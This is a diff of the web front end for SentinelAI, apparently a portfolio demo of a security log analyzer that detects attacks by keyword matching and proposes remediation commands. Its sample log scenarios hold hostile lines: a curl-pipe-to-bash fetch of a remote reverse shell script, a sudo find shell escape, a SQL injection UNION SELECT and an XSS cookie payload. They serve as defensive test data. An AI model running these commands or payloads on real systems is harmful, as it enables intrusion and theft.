@@ -19,16 +19,21 @@
           SentinelAI
           <span class="ml-2 text-[10px] font-mono uppercase bg-slate-800 text-rose-400 px-2 py-0.5 rounded border border-rose-950">SOC SIEM Edition</span>
         </h1>
-        <p class="text-xs text-slate-400">Threat Intelligence, Multi-Stage Log Anomaly Detection & Remediation</p>
+        <p class="text-xs text-slate-400">Threat Intelligence, Multi-Stage Log Anomaly Detection & Remediation Playbooks</p>
       </div>
     </div>
-    <div class="flex items-center space-x-4">
-      <span class="text-xs font-mono text-emerald-400 flex items-center">
-        <span class="w-2 h-2 rounded-full bg-emerald-400 mr-2 animate-ping"></span>
-        Ingestion Stream Active
+    <div class="flex items-center space-x-3">
+      <span class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-emerald-950/80 text-emerald-400 border border-emerald-800">
+        <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 mr-1.5 animate-pulse"></span>
+        Interactive Live Edition
       </span>
-      <a href="/docs" target="_blank" class="text-xs text-slate-400 hover:text-rose-400 transition-colors">
-        <i class="fa-solid fa-code mr-1"></i>API Docs
+      <a href="https://shahzaib-shams2023.github.io/ai-engineering-portfolio/" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-200 px-3 py-1.5 rounded-lg border border-slate-700 transition flex items-center space-x-1.5">
+        <i class="fa-solid fa-arrow-left text-xs"></i>
+        <span>Portfolio</span>
+      </a>
+      <a href="https://github.com/shahzaib-shams2023/sentinel-ai-security-log-analyzer" target="_blank" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-200 px-3 py-1.5 rounded-lg border border-slate-700 transition flex items-center space-x-1.5">
+        <i class="fa-brands fa-github text-sm"></i>
+        <span>GitHub</span>
       </a>
     </div>
   </header>
@@ -59,114 +64,225 @@
               <button type="button" onclick="loadScenario('brute_force_privilege_escalation')" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-200 px-2.5 py-1 rounded transition border border-slate-700">
                 <i class="fa-solid fa-user-ninja mr-1 text-rose-400"></i>SSH Brute Force + PrivEsc
               </button>
-              <button type="button" onclick="loadScenario('log4j_exploit_injection')" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-200 px-2.5 py-1 rounded transition border border-slate-700">
-                <i class="fa-solid fa-bug mr-1 text-amber-400"></i>Log4Shell RCE Probe
+              <button type="button" onclick="loadScenario('web_sql_injection_exfil')" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-200 px-2.5 py-1 rounded transition border border-slate-700">
+                <i class="fa-solid fa-spider mr-1 text-amber-400"></i>SQLi Exploit + Exfil
               </button>
-              <button type="button" onclick="loadScenario('benign_baseline')" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-200 px-2.5 py-1 rounded transition border border-slate-700">
-                <i class="fa-solid fa-check mr-1 text-emerald-400"></i>Benign Baseline
+              <button type="button" onclick="loadScenario('benign_traffic')" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-200 px-2.5 py-1 rounded transition border border-slate-700">
+                <i class="fa-solid fa-circle-check mr-1 text-emerald-400"></i>Benign Baseline Logs
               </button>
             </div>
           </div>
 
-          <button type="submit" id="submitBtn" class="w-full py-2.5 px-4 bg-rose-600 hover:bg-rose-500 text-white rounded-lg font-medium text-xs flex items-center justify-center space-x-2 transition shadow-lg shadow-rose-600/30">
-            <i class="fa-solid fa-magnifying-glass-chart"></i>
-            <span>Analyze Logs & Correlate Campaign</span>
+          <button type="submit" id="submitBtn" class="w-full py-2.5 px-4 bg-rose-600 hover:bg-rose-500 text-white rounded-lg font-medium text-xs flex items-center justify-center space-x-2 transition shadow-lg shadow-rose-600/20">
+            <i class="fa-solid fa-fingerprint"></i>
+            <span>Execute SIEM Threat Analysis</span>
           </button>
         </form>
       </div>
 
-      <!-- MITRE Tactics Radar Summary -->
-      <div class="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl">
-        <h3 class="text-xs font-semibold uppercase tracking-wider text-slate-400 mb-3 flex items-center">
-          <i class="fa-solid fa-diagram-project mr-2 text-indigo-400"></i>Observed MITRE ATT&CK Tactics
+      <!-- Detection Engine Specifications -->
+      <div class="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl text-xs space-y-2">
+        <h3 class="font-semibold text-slate-300 uppercase tracking-wider text-[11px] flex items-center">
+          <i class="fa-solid fa-shield-halved mr-2 text-rose-400"></i>Engine Capabilities
         </h3>
-        <div id="tacticsContainer" class="flex flex-wrap gap-2 text-xs">
-          <span class="text-slate-600 text-xs">Run analysis to identify tactics.</span>
-        </div>
+        <ul class="space-y-1.5 text-slate-400">
+          <li class="flex items-center"><i class="fa-solid fa-check text-emerald-400 text-[10px] mr-2"></i>Multi-Format Normalization (Syslog, CEF, JSON, Web)</li>
+          <li class="flex items-center"><i class="fa-solid fa-check text-emerald-400 text-[10px] mr-2"></i>Multi-Stage Attack Chain Correlation</li>
+          <li class="flex items-center"><i class="fa-solid fa-check text-emerald-400 text-[10px] mr-2"></i>MITRE ATT&CK Matrix TTP Alignment</li>
+          <li class="flex items-center"><i class="fa-solid fa-check text-emerald-400 text-[10px] mr-2"></i>Zero-Trust Containment & Shell Remediation Scripts</li>
+        </ul>
       </div>
     </div>
 
-    <!-- Right Column: Security Analysis & Playbook -->
-    <div class="lg:col-span-7 space-y-6">
-      <!-- Incident Overview Banner -->
-      <div id="incidentBanner" class="hidden bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl">
-        <div class="flex items-center justify-between border-b border-slate-800 pb-3 mb-3">
+    <!-- Right Column: Incident Analysis & Playbook -->
+    <div class="lg:col-span-7 space-y-4">
+      <!-- Incident Severity Banner -->
+      <div id="incidentBanner" class="hidden bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl space-y-3">
+        <div class="flex items-center justify-between">
           <div class="flex items-center space-x-3">
-            <span id="severityBadge" class="text-xs font-bold uppercase px-3 py-1 rounded-full bg-slate-800 text-slate-300 font-mono">
-              Analyzing
-            </span>
-            <span id="incidentId" class="text-xs font-mono text-slate-400">INC-XXXX</span>
+            <span id="severityBadge" class="text-xs font-bold uppercase px-3 py-1 rounded-full"></span>
+            <span id="incidentId" class="text-xs font-mono text-slate-400"></span>
           </div>
-          <span id="analyzedStats" class="text-xs text-slate-400 font-mono">0 logs analyzed</span>
+          <span id="analyzedStats" class="text-xs text-slate-500 font-mono"></span>
         </div>
-        <p id="incidentSummary" class="text-xs text-slate-300 leading-relaxed"></p>
+        <p id="incidentSummary" class="text-xs text-slate-300 leading-relaxed font-medium"></p>
       </div>
 
-      <!-- Correlated Anomaly Alerts -->
-      <div class="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl">
-        <h3 class="text-xs font-semibold uppercase tracking-wider text-slate-400 mb-3 flex items-center">
+      <!-- MITRE Tactics Mapping -->
+      <div class="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl space-y-2">
+        <h3 class="text-xs font-semibold uppercase tracking-wider text-slate-400 flex items-center">
+          <i class="fa-solid fa-crosshairs mr-2 text-rose-400"></i>Observed MITRE ATT&CK Tactics
+        </h3>
+        <div id="tacticsContainer" class="flex flex-wrap gap-2 pt-1">
+          <span class="text-xs text-slate-500">Run analysis to map active attack vectors.</span>
+        </div>
+      </div>
+
+      <!-- Detected Alerts Stream -->
+      <div class="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl space-y-3">
+        <h3 class="text-xs font-semibold uppercase tracking-wider text-slate-400 flex items-center">
           <i class="fa-solid fa-triangle-exclamation mr-2 text-amber-400"></i>Correlated Threat Alerts
         </h3>
-        <div id="alertsContainer" class="space-y-3">
-          <div class="text-center text-slate-600 text-xs py-8">
-            <i class="fa-solid fa-radar text-3xl mb-2 text-slate-700"></i>
-            <p>Ingest logs to inspect correlated anomaly detections.</p>
+        <div id="alertsContainer" class="space-y-2.5 max-h-[220px] overflow-y-auto pr-2">
+          <div class="text-center p-6 text-slate-600 text-xs">
+            Ingest security logs on the left to detect active adversary tactics.
           </div>
         </div>
       </div>
 
-      <!-- SOC Remediation Playbook -->
-      <div id="playbookCard" class="hidden bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl">
-        <div class="flex items-center justify-between border-b border-slate-800 pb-3 mb-3">
-          <h3 class="text-xs font-semibold uppercase tracking-wider text-emerald-400 flex items-center">
-            <i class="fa-solid fa-terminal mr-2"></i>Automated SOC Remediation Playbook
+      <!-- Incident Response Playbook -->
+      <div id="playbookCard" class="hidden bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl space-y-3">
+        <div class="flex items-center justify-between">
+          <h3 class="text-xs font-semibold uppercase tracking-wider text-slate-400 flex items-center">
+            <i class="fa-solid fa-list-check mr-2 text-emerald-400"></i>Automated Incident Response Playbook
           </h3>
-          <span id="containmentTime" class="text-xs text-slate-400 font-mono">Target SLA: 5m</span>
+          <span id="containmentTime" class="text-[10px] font-mono text-emerald-400 bg-emerald-950/60 px-2 py-0.5 rounded border border-emerald-800"></span>
         </div>
-        <div id="playbookSteps" class="space-y-3">
+        <div id="playbookSteps" class="space-y-2.5">
         </div>
       </div>
     </div>
   </main>
 
   <script>
-    let scenarios = {};
+    const scenarios = {
+      brute_force_privilege_escalation: `Oct 24 14:02:11 host-sec-01 sshd[12401]: Failed password for invalid user admin from 198.51.100.44 port 41280 ssh2
+Oct 24 14:02:14 host-sec-01 sshd[12403]: Failed password for invalid user root from 198.51.100.44 port 41282 ssh2
+Oct 24 14:02:18 host-sec-01 sshd[12408]: Failed password for invalid user deploy from 198.51.100.44 port 41286 ssh2
+Oct 24 14:02:22 host-sec-01 sshd[12412]: Failed password for user service_acc from 198.51.100.44 port 41290 ssh2
+Oct 24 14:02:25 host-sec-01 sshd[12415]: Accepted password for service_acc from 198.51.100.44 port 41294 ssh2
+Oct 24 14:03:02 host-sec-01 sudo: service_acc : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh -p \\;
+Oct 24 14:03:40 host-sec-01 bash[12500]: curl -s http://198.51.100.44/rev.sh | bash`,
 
-    async function fetchScenarios() {
-      try {
-        const res = await fetch('/api/scenarios');
-        scenarios = await res.json();
-      } catch (e) {
-        console.error('Failed to load scenarios', e);
-      }
-    }
-    fetchScenarios();
+      web_sql_injection_exfil: `198.51.100.89 - - [24/Oct/2026:14:15:02 +0000] "GET /api/v1/users?id=1%27%20UNION%20SELECT%20username,password_hash%20FROM%20users-- HTTP/1.1" 200 4820
+198.51.100.89 - - [24/Oct/2026:14:15:05 +0000] "GET /api/v1/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1" 200 1280
+198.51.100.89 - - [24/Oct/2026:14:16:10 +0000] "POST /api/v1/export HTTP/1.1" 200 9850000`,
+
+      benign_traffic: `Oct 24 14:00:01 host-sec-01 systemd[1]: Starting Daily apt download activities...
+Oct 24 14:00:05 host-sec-01 systemd[1]: apt-daily.service: Deactivated successfully.
+Oct 24 14:01:22 host-sec-01 sshd[11200]: Accepted publickey for ubuntu from 10.0.1.50 port 52310 ssh2
+Oct 24 14:01:25 host-sec-01 sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/systemctl status nginx`
+    };
 
     function loadScenario(key) {
-      if (scenarios[key]) {
-        document.getElementById('logInput').value = scenarios[key];
+      document.getElementById('logInput').value = scenarios[key];
+      document.getElementById('logForm').dispatchEvent(new Event('submit'));
+    }
+
+    // Client-side fallback analyzer
+    function simulateSIEMAnalysis(rawLogs) {
+      const lower = rawLogs.toLowerCase();
+      let alerts = [];
+      let tactics = [];
+      let severity = 'LOW';
+      let summary = "Log telemetry conforms to baseline parameters. No multi-stage threat patterns detected.";
+
+      if (lower.includes('failed password') && lower.includes('accepted')) {
+        severity = 'CRITICAL';
+        tactics.push('Credential Access', 'Privilege Escalation', 'Execution');
+        summary = "CRITICAL ALERT: Multi-stage cyberattack confirmed. High-frequency credential brute-forcing succeeded with account takeover, followed immediately by privilege escalation via sudo find breakout and external reverse shell payload download.";
+        alerts.push({
+          title: "SSH Credential Brute Force Attack",
+          severity: "HIGH",
+          description: "Multiple authentication failures (4+ attempts) observed from remote IP 198.51.100.44 targeting administrative user accounts.",
+          mitre_technique: { technique_id: "T1110", name: "Brute Force", tactic: "Credential Access" }
+        });
+        alerts.push({
+          title: "Sudo GTFOBins Privilege Escalation",
+          severity: "CRITICAL",
+          description: "Execution of /usr/bin/find with shell escape parameters (-exec /bin/sh -p) granting root privileges to service_acc.",
+          mitre_technique: { technique_id: "T1548.003", name: "Sudo and Sudo Caching", tactic: "Privilege Escalation" }
+        });
+        alerts.push({
+          title: "Remote Reverse Shell Payload Staging",
+          severity: "CRITICAL",
+          description: "Unauthenticated egress pipe: curl fetching executable shell script into direct interpreter execution.",
+          mitre_technique: { technique_id: "T1059.004", name: "Unix Shell", tactic: "Execution" }
+        });
+      } else if (lower.includes('union select') || lower.includes('script') || lower.includes('injection')) {
+        severity = 'HIGH';
+        tactics.push('Initial Access', 'Exfiltration');
+        summary = "HIGH ALERT: Web application intrusion identified. SQL injection attack targeted user credentials, followed by an anomalous 9.8MB bulk data egress export.";
+        alerts.push({
+          title: "SQL Injection Data Extraction",
+          severity: "HIGH",
+          description: "Probing of database schema via UNION SELECT query on /api/v1/users endpoint.",
+          mitre_technique: { technique_id: "T1190", name: "Exploit Public-Facing Application", tactic: "Initial Access" }
+        });
+        alerts.push({
+          title: "Abnormal Data Egress Volume",
+          severity: "MEDIUM",
+          description: "Response body exfiltration of 9.8MB on unthrottled export endpoint.",
+          mitre_technique: { technique_id: "T1041", name: "Exfiltration Over C2 Channel", tactic: "Exfiltration" }
+        });
       }
+
+      return {
+        incident_id: "INC-" + Math.floor(100000 + Math.random() * 900000),
+        total_logs_analyzed: rawLogs.split('\n').filter(l => l.trim()).length,
+        anomalies_detected: alerts.length,
+        overall_severity: severity,
+        attack_summary: summary,
+        mitre_tactics_observed: tactics,
+        alerts: alerts,
+        playbook: alerts.length > 0 ? {
+          estimated_containment_time_minutes: 5,
+          remediation_steps: [
+            {
+              step_number: 1,
+              action_type: "Network Quarantine",
+              description: "Block offending IP on edge firewall and terminate all open SSH sessions.",
+              command: "iptables -A INPUT -s 198.51.100.44 -j DROP && pkill -u service_acc",
+              automated: true
+            },
+            {
+              step_number: 2,
+              action_type: "Account Lockdown",
+              description: "Disable compromised account credentials and revoke active sudo tokens.",
+              command: "passwd -l service_acc && passwd -d service_acc",
+              automated: true
+            },
+            {
+              step_number: 3,
+              action_type: "Forensic Volatility Dump",
+              description: "Capture process memory snapshot and inspect /tmp directory artifacts.",
+              command: "ls -la /tmp && ps auxf > /var/log/forensics_dump.txt",
+              automated: false
+            }
+          ]
+        } : null
+      };
     }
 
     document.getElementById('logForm').addEventListener('submit', async (e) => {
       e.preventDefault();
-      const raw_logs = document.getElementById('logInput').value.trim();
-      if (!raw_logs) return;
+      const logs = document.getElementById('logInput').value.trim();
+      if (!logs) return;
 
       const submitBtn = document.getElementById('submitBtn');
       submitBtn.disabled = true;
 
       try {
-        const res = await fetch('/api/logs/analyze', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ raw_logs })
-        });
-        if (!res.ok) {
-          const err = await res.json();
-          throw new Error(err.detail || 'Analysis failed');
+        let data = null;
+        if (!window.location.hostname.includes('github.io')) {
+          try {
+            const response = await fetch('/api/analyze', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ raw_logs: logs })
+            });
+            if (response.ok) {
+              data = await response.json();
+            }
+          } catch (e) {
+            console.warn('Backend unavailable, running client engine');
+          }
         }
-        const data = await res.json();
+
+        if (!data) {
+          data = simulateSIEMAnalysis(logs);
+        }
+
         renderAnalysis(data);
       } catch (err) {
         alert('Error: ' + err.message);
@@ -249,7 +365,11 @@
         playbookCard.classList.add('hidden');
       }
     }
+
+    // Load initial scenario on page load
+    window.addEventListener('DOMContentLoaded', () => {
+      loadScenario('brute_force_privilege_escalation');
+    });
   </script>
 </body>
 </html>
-
